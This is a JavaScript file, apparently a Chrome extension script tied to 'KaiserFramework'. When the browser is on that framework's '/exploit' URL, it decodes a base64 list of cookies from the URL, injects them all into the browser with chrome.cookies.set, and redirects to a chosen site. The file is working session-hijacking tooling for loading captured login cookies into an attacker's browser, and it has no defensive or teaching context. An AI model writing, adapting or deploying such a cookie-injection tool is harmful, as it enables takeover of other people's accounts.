function setCookie(cookieName, cookieDomain, cookieUrl, cookieVal) {
    // console.log(cookieName,cookieDomain, cookieVal,cookieUrl);
    chrome.cookies.set({
        "name": cookieName,
        "domain": cookieDomain,
        "url": cookieUrl,
        "value": cookieVal
    }, function (cookie) {
        console.log(JSON.stringify(cookie));
        console.log(chrome.extension.lastError);
        console.log(chrome.runtime.lastError);
    });
}

function parseCookie(cookie) {
    setCookie(cookie['name'], cookie['domain'], cookie['url'], cookie['value']);
}


function init() {
    chrome.tabs.query({
        'active': true,
        'lastFocusedWindow': true
    }, function (tabs) {
        var urlstring = tabs[0].url;
        var url = new URL(urlstring);
        if (urlstring.includes("kaiserframework.com/exploit")) {
            //get vals from GET param
            var cookieStr = decodeURIComponent(url.searchParams.get("cookie")).replace(" ", "+");
            //base64 decode
            cookieStr = atob(cookieStr);
            console.log(cookieStr);
            var cookies = JSON.parse(cookieStr);
            var redirect = atob(url.searchParams.get("redirect").toString());

            for (var cookie of cookies) {
                parseCookie(cookie)
            }

            document.write('<body style="background-color: #0a1c2e"><center><img src="kaiserlogo.png" height="150" width="150"><h1 style="color: green">Cookies set, redirecting to ' + redirect + '</h1></center></body>');
            //update tab with redirect param url
            chrome.tabs.query({
                currentWindow: true,
                active: true
            }, function (tab) {
                chrome.tabs.update(tab.id, {
                    url: redirect
                });
            });
        } else {
            document.write('<body style="background-color: #0a1c2e"><center><img src="kaiserlogo.png" height="150" width="150"><h1 style="color: red">Only works with payment links from KaiserFramework</h1></center></body>');
        }
    });
}

window.onload = init;
